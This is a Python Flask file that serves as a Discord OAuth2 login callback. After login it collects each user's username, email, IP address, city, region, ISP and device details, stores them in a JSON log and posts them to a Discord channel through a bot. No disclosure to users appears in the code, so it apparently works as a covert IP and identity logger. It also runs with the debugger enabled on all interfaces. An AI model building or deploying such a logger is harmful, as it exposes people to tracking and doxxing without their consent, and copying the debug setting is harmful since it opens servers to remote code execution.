# main.py
from flask import Flask, request, jsonify
import requests, json, os, threading
from dotenv import load_dotenv
from datetime import datetime
from discord_bot import bot
from user_agents import parse
from collections import Counter

load_dotenv()

app = Flask(__name__)
ACCESS_LOG_FILE = "access_log.json"

DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")


def get_client_ip():
    if "X-Forwarded-For" in request.headers:
        return request.headers["X-Forwarded-For"].split(",")[0].strip()
    return request.remote_addr


def get_geo_info(ip: str):
    """IPベースで可能な限り県・市まで取得"""
    results = []

    # ip-api
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}?lang=ja&fields=status,country,regionName,city,isp", timeout=2)
        data = res.json()
        if data.get("status") == "success":
            results.append({
                "country": data.get("country"),
                "region": data.get("regionName"),
                "city": data.get("city"),
                "isp": data.get("isp"),
            })
    except:
        pass

    # ipinfo.io
    try:
        res = requests.get(f"https://ipinfo.io/{ip}/json", timeout=2)
        data = res.json()
        if "country" in data:
            results.append({
                "country": data.get("country"),
                "region": data.get("region", None),
                "city": data.get("city", None),
                "isp": data.get("org", None),
            })
    except:
        pass

    # ipwhois.app
    try:
        res = requests.get(f"https://ipwhois.app/json/{ip}?lang=ja", timeout=2)
        data = res.json()
        if data.get("success", True):
            results.append({
                "country": data.get("country"),
                "region": data.get("region"),
                "city": data.get("city"),
                "isp": data.get("isp"),
            })
    except:
        pass

    if not results:
        return {"ip": ip, "country": "不明", "region": "不明", "city": "不明", "isp": "不明"}

    # 統合処理（最も多い値を採用）
    countries = [r["country"] for r in results if r.get("country")]
    country = Counter(countries).most_common(1)[0][0] if countries else "不明"

    regions = [r["region"] for r in results if r.get("region")]
    region = Counter(regions).most_common(1)[0][0] if regions else "不明"

    city = next((r["city"] for r in results if r.get("city")), "不明")
    isp = next((r["isp"] for r in results if r.get("isp")), "不明")

    return {"ip": ip, "country": country, "region": region, "city": city, "isp": isp}


def save_log(discord_id, data):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}
    if discord_id not in logs:
        logs[discord_id] = {"history": []}
    data["timestamp"] = now
    logs[discord_id]["history"].append(data)
    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)


@app.route("/")
def index():
    # テスト用ルート（ブラウザで確認可能）
    return {"status": "running", "info": "Discord OAuth2 /callback にアクセスしてください"}


@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "コードがありません", 400

    # Discordトークン取得
    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": "identify email"
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    token_response = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
    token_json = token_response.json()
    access_token = token_json.get("access_token")
    if not access_token:
        return "アクセストークン取得失敗", 400

    user_info = requests.get("https://discord.com/api/users/@me", headers={"Authorization": f"Bearer {access_token}"}).json()

    # IP とジオロケーション
    ip = get_client_ip()
    if ip.startswith(("127.", "10.", "192.", "172.")):
        ip = requests.get("https://api.ipify.org").text
    geo = get_geo_info(ip)

    ua_raw = request.headers.get("User-Agent", "不明")
    ua = parse(ua_raw)

    user_data = {
        "username": f"{user_info['username']}#{user_info['discriminator']}",
        "id": user_info["id"],
        "email": user_info.get("email"),
        "ip": ip,
        "country": geo["country"],
        "region": geo["region"],
        "city": geo["city"],
        "isp": geo["isp"],
        "user_agent": ua_raw,
        "os": ua.os.family,
        "browser": ua.browser.family,
        "device": ua.device.family
    }

    save_log(user_info["id"], user_data)

    # Discord Bot 送信
    bot.loop.create_task(bot.send_log(
        f"✅ 新しいアクセスログ:\n"
        f"```名前: {user_data['username']}\n"
        f"ID: {user_data['id']}\n"
        f"メール: {user_data.get('email')}\n"
        f"IP: {user_data['ip']}\n"
        f"国: {user_data['country']} / {user_data['region']} / {user_data['city']}\n"
        f"ISP: {user_data['isp']}\n"
        f"OS: {user_data['os']} / ブラウザ: {user_data['browser']}\n"
        f"デバイス: {user_data['device']}```"
    ))

    return jsonify(user_data)


def run_bot():
    bot.run(DISCORD_BOT_TOKEN)


if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(debug=True, host="0.0.0.0", port=5000)
